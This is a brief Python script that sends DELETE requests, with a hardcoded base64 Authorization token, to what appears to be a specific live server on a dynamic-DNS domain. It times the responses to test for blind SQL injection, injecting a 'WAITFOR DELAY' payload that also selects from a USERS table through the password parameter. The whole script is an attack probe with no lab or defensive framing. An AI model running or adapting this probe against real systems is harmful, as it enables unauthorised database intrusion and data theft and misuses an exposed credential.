import time
import requests

def time_fn(psw):
    start = time.time()
    x = requests.delete(
        "https://geomediasrv.duckdns.org:9911/post/1",
        headers={"Authorization": "R2VvTWVkaWEyMDI2X0FuZHJvaWRPZmZpY2lhbA=="},
        params={"password": psw}
    )
    print(x.json())
    return time.time() - start


print(time_fn("1"))
print(time_fn("x'; WAITFOR DELAY '00:00:05'; SELECT * FROM USERS;--"))